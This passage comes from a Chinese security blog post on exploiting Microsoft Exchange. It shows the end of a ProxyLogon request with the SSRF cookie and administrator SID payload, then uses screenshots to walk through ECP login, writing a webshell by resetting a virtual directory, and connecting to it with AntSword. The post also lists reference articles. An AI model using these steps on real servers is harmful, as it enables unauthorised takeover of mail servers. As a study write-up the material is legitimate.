</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">X-BEResource=]@exchange:444/ecp/proxyLogon.ecp#~1942062522</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">79</span>
</span></span><span class="line"><span class="cl"><span class="n">msExchLogonMailbox</span><span class="o">:</span> <span class="l">S-1-5-21-277752755-3920030661-3949043096-500</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;r</span> <span class="na">at=</span><span class="s">&#34;Negotiate&#34;</span> <span class="na">ln=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;&lt;s&gt;</span>S-1-5-21-277752755-3920030661-3949043096-500<span class="nt">&lt;/s&gt;&lt;/r&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181121660.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181121660.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181121660.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181121660.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181121660.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181121660.png-water_print" /></p>
<p>接下来可以直接用这个 SessionID 登录 ECP。在服务器 -&gt; 虚拟目录中：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527532.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527532.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527532.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527532.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527532.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527532.png-water_print" /></p>
<p>编辑虚拟目录：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527787.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527787.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527787.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527787.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527787.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527787.png-water_print" /></p>
<p>重置虚拟目录：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527205.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527205.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527205.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527205.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527205.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181527205.png-water_print" /></p>
<p>可以看到，文件已落地：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528064.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528064.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528064.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528064.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528064.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528064.png-water_print" /></p>
<p>内容为：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528205.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528205.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528205.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528205.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528205.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181528205.png-water_print" /></p>
<p>蚁剑连接：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181534838.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181534838.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181534838.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181534838.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181534838.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181534838.png-water_print" /></p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://paper.seebug.org/775/" target="_blank" rel="noopener noreffer">深入 Exchange Server 在网络渗透下的利用方法</a></li>
<li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener noreffer">Abusing Exchange: One API call away from Domain Admin</a></li>
<li><a href="https://fdlucifer.github.io/2020/10/12/cve-2020-0688/" target="_blank" rel="noopener noreffer">cve-2020-0688-Exchange-远程代码执行介绍</a></li>
<li><a href="https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/" target="_blank" rel="noopener noreffer">A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</a></li>
<li><a href="https://hosch3n.github.io/2021/08/22/ProxyLogon%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" target="_blank" rel="noopener noreffer">ProxyLogon漏洞分析</a></li>
<li><a href="https://jishuin.proginn.com/p/763bfbd5ac72" target="_blank" rel="noopener noreffer">Exchange ProxyLogon 系列漏洞分析</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2021-10-16</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-title="Exchange 漏洞利用"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-title="Exchange 漏洞利用"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="http://localhost:1313/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-title="Exchange 漏洞利用"><i class="fab fa-skype fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/">域安全</a>,&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="Shiro 反序列化漏洞原理分析"><i class="fas fa-angle-left fa-fw"></i>Shiro 反序列化漏洞原理分析</a>
            <a href="/2021/10/docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/" class="next" rel="next" title="Docker 核心技术">Docker 核心技术<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
